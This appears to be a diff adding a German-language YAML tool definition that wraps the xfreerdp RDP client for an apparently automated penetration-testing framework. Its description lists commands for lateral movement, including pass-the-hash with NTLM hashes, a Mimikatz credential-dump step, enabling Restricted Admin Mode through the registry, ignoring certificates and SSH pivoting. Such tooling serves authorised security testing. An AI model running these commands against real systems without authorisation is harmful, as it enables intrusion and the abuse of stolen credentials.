@@ -1,0 +1,112 @@
+name: "xfreerdp"
+command: "xfreerdp"
+enabled: true
+short_description: "xfreerdp – RDP-Client für Lateral Movement via Remote Desktop Protocol"
+description: |
+  xfreerdp ist ein freier RDP-Client für Linux. Ermöglicht Lateral Movement über
+  das Remote Desktop Protocol (Port 3389). Unterstützt Pass-the-Hash (PtH),
+  Restricted Admin Mode und Network Level Authentication Bypass.
+
+  **Basis-Verbindung:**
+  ```bash
+  # Passwort-basiert
+  xfreerdp /u:Administrator /p:Password123 /v:192.168.1.100
+
+  # Mit Domain
+  xfreerdp /u:domain\\user /p:pass /v:192.168.1.100
+
+  # Mit Port
+  xfreerdp /u:admin /p:pass /v:192.168.1.100:3389
+  ```
+
+  **Pass-the-Hash (PtH) via RDP:**
+  ```bash
+  # Restricted Admin Mode erforderlich (Windows Server 2012+)
+  xfreerdp /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c /v:192.168.1.100 /cert:ignore
+
+  # Restricted Admin aktivieren (falls Rechte vorhanden)
+  # reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0
+  ```
+
+  **Nützliche Optionen:**
+  ```bash
+  # Drive Sharing (Dateien übertragen)
+  xfreerdp /u:admin /p:pass /v:target /drive:share,/tmp/
+
+  # Clipboard aktivieren
+  xfreerdp /u:admin /p:pass /v:target /clipboard
+
+  # Vollbild
+  xfreerdp /u:admin /p:pass /v:target /f
+
+  # Zertifikat ignorieren
+  xfreerdp /u:admin /p:pass /v:target /cert:ignore
+
+  # NLA deaktiviert / CredSSP
+  xfreerdp /u:admin /p:pass /v:target /sec:rdp
+  ```
+
+  **RDP für Lateral Movement:**
+  ```bash
+  # Nach Pass-the-Hash mit Mimikatz-Dump
+  # 1. Hash dumpen
+  # sekurlsa::logonpasswords -> NTLM: 8846f7eaee8fb117ad06bdd830b7586c
+  # 2. PtH via RDP
+  xfreerdp /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /v:next.target.local /cert:ignore
+  ```
+
+  **RDP-Tunneling via SSH:**
+  ```bash
+  # RDP über SSH-Tunnel
+  ssh -L 13389:target:3389 pivot@pivot.host
+  xfreerdp /u:admin /p:pass /v:127.0.0.1:13389
+  ```
+
+  **Verwendungsszenarien:**
+  - Lateral Movement über RDP
+  - Remote Administration nach Kompromittierung
+  - Pass-the-Hash gegen Windows-Systeme
+  - Datei-Transfer via Drive Sharing
+
+  **Hinweise:**
+  - Restricted Admin Mode für PtH erforderlich
+  - RDP-Verbindungen werden in Windows Event Logs gespeichert
+  - /cert:ignore für selbstsignierte Zertifikate
+parameters:
+  - name: "target"
+    type: "string"
+    description: "Ziel-Host oder IP (z.B. 192.168.1.100 oder /v:192.168.1.100)"
+    required: true
+    flag: "/v:"
+    format: "template"
+    template: "/v:{value}"
+  - name: "username"
+    type: "string"
+    description: "Benutzername (z.B. Administrator oder DOMAIN\\\\user)"
+    required: true
+    flag: "/u:"
+    format: "template"
+    template: "/u:{value}"
+  - name: "password"
+    type: "string"
+    description: "Passwort für RDP-Verbindung"
+    required: false
+    default: ""
+    flag: "/p:"
+    format: "template"
+    template: "/p:{value}"
+  - name: "pth"
+    type: "string"
+    description: "NTLM-Hash für Pass-the-Hash (LM:NT Format, Restricted Admin erforderlich)"
+    required: false
+    default: ""
+    flag: "/pth:"
+    format: "template"
+    template: "/pth:{value}"
+  - name: "additional_args"
+    type: "string"
+    description: "Weitere xfreerdp-Optionen (z.B. /cert:ignore /clipboard /drive:share,/tmp/ /f)"
+    required: false
+    default: "/cert:ignore"
+    position: 0
+    format: "positional"
